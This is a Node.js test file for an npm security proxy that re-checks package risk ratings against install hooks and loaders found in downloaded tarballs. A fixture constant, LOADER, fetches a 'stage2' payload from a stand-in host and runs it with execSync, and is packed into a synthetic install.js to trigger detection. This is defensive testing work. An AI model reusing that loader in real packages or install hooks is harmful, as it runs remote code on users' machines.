// Since 0.1.6 (cft-policy-1.3): what a download adds to the re-tier. A strict row the re-tier showed as a NOTE still arms the
// tarball walk; when the walk finds any tarball check (a named WARN or a contributing NOTE) or a tarball package.json that adds or
// changes an install hook, the strict row warns again, in the stored record and in every re-evaluation after it. install-introduced follows the tarball package.json npm runs once a walk read it: hooks only the registry entry
// declares no longer warn (the install-manifest-mismatch check keeps its own named WARN), a first hook only the tarball declares
// does. Written before the code. Tarballs are synthetic and nothing is run.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import zlib from 'node:zlib';
import { createProxyServer } from '../../proxy/server.js';
import { resetDependencyCache } from '../../gates/dependency-cache.js';
import { forgetManifestHooks } from '../../proxy/manifest-check.js';
import { armedBy } from '../../proxy/static-checks.js';
import { tarballRow } from '../../gates/install-introduced.js';
import { reraise, lateGuards } from '../../gates/retier-late.js';
import { DEFAULT_GATE_MODULES } from '../../gates/index.js';
import G from '../../seed/v3/gate.js';
import { buildSeed, openFixtureSeed, docFor, manifestFor, iso, TIP_S, STEP_S, WARNCFG } from '../seed-v3/u05-fixtures.mjs';

const STRICT = ['seed-v3:channel-a:critical', 'seed-v3:dac-trajectory:surface'];
const RETIER = { version: 'retier-1.0', placement: 'recorded', baseline: '1.3.0', basis: 'same flavor', flags_dropped: ['publisher'], guards: [],
  words: 'not new against 1.3.0 (same flavor): publisher already held there' };
const seedRow = (over = {}) => ({ gate: 'seed-v3', result: 'ALLOW', retier: RETIER,
  rows: [{ gate: 'seed-v3:known-malicious-pin', result: 'ALLOW' }, { gate: STRICT[0], result: 'NOTE' }, { gate: 'seed-v3:dac-trajectory:any', result: 'NOTE' }],
  detail: 'cft-policy-1.3: seed-v3:known-malicious-pin: no recorded advisory pins this version | also (contributing): x', ...over });

// ------------------------------------------------------------------------------------------------ pure
test('RL1 install-introduced re-read against the tarball package.json npm runs', () => {
  const basis = (ever, gyp = false) => ({ ever, gyp, tarball: null });
  const warn = { gate: 'install-introduced', result: 'WARN', detail: 'postinstall (husky) present; no earlier version (settled 24 h: 3 versions) had an install hook', hooks_basis: basis(false) };
  // registry-only (pinst renames postinstall in the packed copy): npm runs none, so the row no longer warns
  const ro = tarballRow(warn, {}, { postinstall: 'husky' });
  assert.equal(ro.result, 'NOTE'); assert.equal(ro.hooks_basis.tarball, 'registry-only');
  assert.equal(ro.detail, 'the registry entry declares postinstall; the tarball package.json npm runs declares none');
  // a first hook only the tarball declares
  const allow = { gate: 'install-introduced', result: 'ALLOW', detail: 'no install hook introduced (settled 24 h: 3 versions)', hooks_basis: basis(false) };
  const add = tarballRow(allow, { postinstall: 'node s.js' }, {});
  assert.equal(add.result, 'WARN'); assert.equal(add.hooks_basis.tarball, 'added'); assert.match(add.detail, /declares postinstall; no earlier version had an install hook/);
  // a package that always had hooks: a changed hook keeps the row's result and says what npm runs
  const ever = tarballRow({ ...allow, hooks_basis: basis(true) }, { postinstall: 'node b.js' }, { postinstall: 'node a.js' });
  assert.equal(ever.result, 'ALLOW'); assert.equal(ever.hooks_basis.tarball, 'changed'); assert.match(ever.detail, /npm runs declares postinstall$/);
  // gypfile with no install/preinstall hook stays a WARN when the tarball drops the registry's postinstall
  assert.equal(tarballRow({ ...warn, hooks_basis: basis(false, true) }, {}, { postinstall: 'husky' }).result, 'WARN');
  // nothing to re-read: the same hooks, an already re-read row, no basis (an older runtime's row), a SKIP
  assert.equal(tarballRow(warn, { postinstall: 'husky' }, { postinstall: 'husky' }), null);
  assert.equal(tarballRow(ro, {}, { postinstall: 'husky' }), null);
  assert.equal(tarballRow({ ...warn, hooks_basis: undefined }, {}, { postinstall: 'husky' }), null);
  assert.equal(tarballRow({ gate: 'install-introduced', result: 'SKIP', detail: 'not evaluable', hooks_basis: basis(false) }, {}, { postinstall: 'x' }), null);
});

test('RL2 the late guards: a re-tiered strict row warns again on any tarball check or a hook the tarball adds or changes; nothing else moves it', () => {
  const s1 = { gate: 'static:S1-loader-in-hook-target', result: 'NOTE', detail: 'x' };
  const r = reraise([seedRow(), s1]);
  assert.equal(r.result, 'WARN'); assert.deepEqual(r.rows.map((x) => x.result), ['ALLOW', 'WARN', 'NOTE'], 'only the strict row moves');
  assert.equal(r.retier.placement, 'raised'); assert.deepEqual(r.retier.guards, ['tarball-check']);
  assert.match(r.detail, /^cft-policy-1\.3: seed-v3:channel-a:critical: warns again after the download \(tarball check S1-loader-in-hook-target fired\)/);
  const hook = { gate: 'install-introduced', result: 'WARN', detail: 'x', hooks_basis: { ever: false, gyp: false, tarball: 'added' } };
  assert.deepEqual(reraise([seedRow(), hook]).retier.guards, ['tarball-hook']);
  assert.equal(reraise([seedRow(), { ...hook, hooks_basis: { ever: false, gyp: false, tarball: 'registry-only' } }]), null, 'a hook the tarball drops is no guard');
  assert.equal(reraise([seedRow(), { ...s1, result: 'ALLOW' }]), null, 'a check that did not fire');
  assert.equal(reraise([seedRow({ retier: { ...RETIER, placement: 'raised' } }), s1]), null, 'already raised');
  assert.equal(reraise([seedRow({ retier: undefined }), s1]), null, 'no re-tier');
  assert.equal(reraise([seedRow({ result: 'BLOCK' }), s1]).result, 'BLOCK', 'a BLOCK stays a BLOCK');
  assert.deepEqual(lateGuards([{ gate: 'static:S0-shell-fetch-in-hook', result: 'WARN' }]).ids, ['tarball-check']);
});

test('RL3 a strict row shown as a note arms the tarball walk, as a named WARN does', () => {
  assert.match(armedBy([seedRow()]), /strict row shown as a note/);
  assert.equal(armedBy([seedRow({ rows: [{ gate: 'seed-v3:known-malicious-pin', result: 'ALLOW' }, { gate: STRICT[0], result: 'ALLOW' }] })]), null);
});

// ------------------------------------------------------------------------------------------------ through the proxy
function hdr(name, size) {
  const h = Buffer.alloc(512, 0); Buffer.from(name, 'utf8').copy(h, 0, 0, 100);
  h.write('0000644\0', 100); h.write('0000000\0', 108); h.write('0000000\0', 116); h.write(`${size.toString(8).padStart(11, '0')}\0`, 124, 'latin1');
  h.write('00000000000\0', 136); h.write('        ', 148); h.write('0', 156, 'latin1'); h.write('ustar\0', 257, 'latin1'); h.write('00', 263, 'latin1');
  let sum = 0; for (let i = 0; i < 512; i += 1) sum += h[i]; h.write(`${sum.toString(8).padStart(6, '0')}\0 `, 148, 'latin1'); return h;
}
const pad = (b) => Buffer.concat([b, Buffer.alloc((512 - (b.length % 512)) % 512, 0)]);
const tgz = (files) => zlib.gzipSync(Buffer.concat([...Object.entries(files).flatMap(([p, c]) => [hdr(`package/${p}`, Buffer.byteLength(c)), pad(Buffer.from(c))]), Buffer.alloc(1024, 0)]));
const LOADER = 'const https = require("https"); const cp = require("child_process");\nhttps.get("https://cdn.example.invalid/stage2", (r) => { let b = ""; r.on("data", (c) => { b += c; }); r.on("end", () => cp.execSync(b)); });\n';
const BENIGN = 'module.exports = 1;\n';

// q: the seed records 1.0.0-1.2.0 by alice; bob published 1.3.0 and, 99 steps (about 114 days) later, 1.4.0, both with the same
// postinstall. 1.4.0 breaks Channel-A against the seed tip and is not new against 1.3.0: the re-tier shows it as a note.
const BOB = (v) => manifestFor('q', v, { _npmUser: { name: 'bob', email: 'bob@example.net' }, maintainers: [{ name: 'bob', email: 'bob@example.net' }],
  gitHead: undefined, dist: { unpackedSize: 3000 }, main: 'index.js', scripts: { postinstall: 'node install.js' } });
const Q = docFor('q', [['1.3.0', iso(TIP_S + STEP_S), BOB('1.3.0')], ['1.4.0', iso(TIP_S + 100 * STEP_S), BOB('1.4.0')]]);
// r: pinst. The registry entry of 1.1.0 declares postinstall "husky" (the first hook of r); the packed package.json renames it.
const H = 3_600_000; const T0 = Date.parse('2026-03-01T00:00:00Z'); const at = (h) => new Date(T0 + h * H).toISOString();
const R = { name: 'r', 'dist-tags': { latest: '1.1.0' }, time: { '1.0.0': at(0), '1.1.0': at(48) },
  versions: { '1.0.0': { name: 'r', version: '1.0.0', main: 'index.js' }, '1.1.0': { name: 'r', version: '1.1.0', main: 'index.js', scripts: { postinstall: 'husky' } } } };

async function withProxy(tarballs, fn) {
  resetDependencyCache(); forgetManifestHooks();
  const s = buildSeed({ layout: '1.1' }); const seed = openFixtureSeed(s.dbPath);
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'retier-late-'));
  const docs = { '/q': Q, '/r': R };
  const upstream = http.createServer((req, res) => {
    const u = decodeURIComponent(req.url.split('?')[0]);
    if (tarballs[u]) { res.writeHead(200, { 'content-type': 'application/octet-stream' }); res.end(tarballs[u]); return; }
    if (docs[u]) { res.writeHead(200, { 'content-type': 'application/json' }); res.end(JSON.stringify(docs[u])); return; }
    res.writeHead(404, { 'content-type': 'application/json' }); res.end('{}');
  });
  await new Promise((r) => upstream.listen(0, '127.0.0.1', r));
  const gate = G.createSeedV3Gate({ seed, config: WARNCFG, domainVersionCount: 'from-packument' });
  const proxy = createProxyServer({ port: 0, host: '127.0.0.1', upstream: `http://127.0.0.1:${upstream.address().port}`,
    witnessDbPath: path.join(dir, 'witness.db'), headersTimeoutMs: 10_000, bodyTimeoutMs: 10_000 }, { gateModules: [...DEFAULT_GATE_MODULES, gate] });
  await new Promise((r) => proxy.listen(0, '127.0.0.1', r));
  const base = `http://127.0.0.1:${proxy.address().port}`;
  const logs = []; const realErr = console.error; console.error = (m) => logs.push(String(m));
  try { return await fn({ base, proxy, logs }); } finally {
    console.error = realErr;
    await new Promise((r) => proxy.close(r)); await new Promise((r) => upstream.close(r));
    seed.close(); s.cleanup(); fs.rmSync(dir, { recursive: true, force: true }); resetDependencyCache(); forgetManifestHooks();
  }
}
const get = (u) => new Promise((resolve, reject) => http.get(u, { agent: false }, (res) => {
  const chunks = []; res.on('data', (x) => chunks.push(x)); res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: Buffer.concat(chunks) }));
}).on('error', reject));
const settle = () => new Promise((r) => setTimeout(r, 250));
const latest = (proxy, pkg, v) => proxy.witnessDb.getLatestDecision(pkg, v);
const seedOf = (d) => d.gates_fired.find((g) => g.gate === 'seed-v3');
const strictOf = (d) => seedOf(d).rows.find((x) => x.gate === STRICT[0]).result;
const qTarball = (installJs) => ({ '/q/-/q-1.4.0.tgz': tgz({ 'package.json': JSON.stringify(Q.versions['1.4.0']), 'install.js': installJs, 'index.js': BENIGN }) });

test('RL4 a re-tiered release with a clean tarball stays a note: served without a notice, walked once, still ALLOW', async () => {
  await withProxy(qTarball(BENIGN), async ({ base, proxy }) => {
    assert.equal((await get(`${base}/q`)).status, 200);
    let d = latest(proxy, 'q', '1.4.0');
    assert.equal(strictOf(d), 'NOTE', JSON.stringify(seedOf(d))); assert.equal(d.disposition, 'ALLOW'); assert.equal(seedOf(d).retier.placement, 'recorded');
    const t = await get(`${base}/q/-/q-1.4.0.tgz`); await settle();
    assert.equal(t.status, 200); assert.equal(t.headers['npm-notice'], undefined);
    d = latest(proxy, 'q', '1.4.0');
    const s1 = d.gates_fired.find((g) => g.gate === 'static:S1-loader-in-hook-target');
    assert.match(s1.detail, /armed by a strict row shown as a note/, 'the walk was armed by the re-tiered row');
    assert.equal(s1.result, 'ALLOW'); assert.equal(strictOf(d), 'NOTE'); assert.equal(d.disposition, 'ALLOW');
  });
});

test('RL5 a re-tiered release whose hook target carries a loader warns again after the download, and keeps warning on re-evaluation', async () => {
  await withProxy(qTarball(LOADER), async ({ base, proxy, logs }) => {
    await get(`${base}/q`);
    assert.equal(strictOf(latest(proxy, 'q', '1.4.0')), 'NOTE');
    await get(`${base}/q/-/q-1.4.0.tgz`); await settle();
    let d = latest(proxy, 'q', '1.4.0');
    assert.equal(d.gates_fired.find((g) => g.gate === 'static:S1-loader-in-hook-target').result, 'NOTE', 'S1 is contributing');
    assert.equal(strictOf(d), 'WARN'); assert.equal(seedOf(d).result, 'WARN'); assert.equal(d.disposition, 'WARN');
    assert.equal(seedOf(d).retier.placement, 'raised'); assert.deepEqual(seedOf(d).retier.guards, ['tarball-check']);
    assert.ok(logs.some((l) => l.startsWith('[gate] q@1.4.0: WARN named seed-v3')), JSON.stringify(logs));
    // the next download says it
    const t2 = await get(`${base}/q/-/q-1.4.0.tgz`); await settle();
    assert.match(String(t2.headers['npm-notice']), /^chaingate: WARNING q@1\.4\.0: /);
    // a re-observation re-runs the gates (the strict row is a NOTE again there) and carries the walk's rows: it keeps warning
    await get(`${base}/q`);
    d = latest(proxy, 'q', '1.4.0');
    assert.equal(strictOf(d), 'WARN', JSON.stringify(seedOf(d))); assert.equal(d.disposition, 'WARN');
  });
});

test('RL6 pinst: the registry entry adds postinstall, the packed package.json does not; after the walk install-introduced is a note and MC keeps its own warning', async () => {
  const tar = { '/r/-/r-1.1.0.tgz': tgz({ 'package.json': JSON.stringify({ name: 'r', version: '1.1.0', main: 'index.js', scripts: { _postinstall: 'husky' } }), 'index.js': BENIGN }) };
  await withProxy(tar, async ({ base, proxy }) => {
    await get(`${base}/r`);
    const ii = (d) => d.gates_fired.find((g) => g.gate === 'install-introduced');
    assert.equal(ii(latest(proxy, 'r', '1.1.0')).result, 'WARN', 'before the download the registry entry is all there is');
    await get(`${base}/r/-/r-1.1.0.tgz`); await settle();
    let d = latest(proxy, 'r', '1.1.0');
    assert.equal(ii(d).result, 'NOTE'); assert.equal(ii(d).hooks_basis.tarball, 'registry-only');
    assert.equal(d.gates_fired.find((g) => g.gate === 'install-manifest-mismatch').result, 'WARN', 'the mismatch check keeps its own named WARN');
    assert.equal(d.disposition, 'WARN');
    await get(`${base}/r`);
    d = latest(proxy, 'r', '1.1.0');
    assert.equal(ii(d).result, 'NOTE', 'a re-evaluation carries the tarball reading'); assert.equal(ii(d).hooks_basis.tarball, 'registry-only');
  });
});
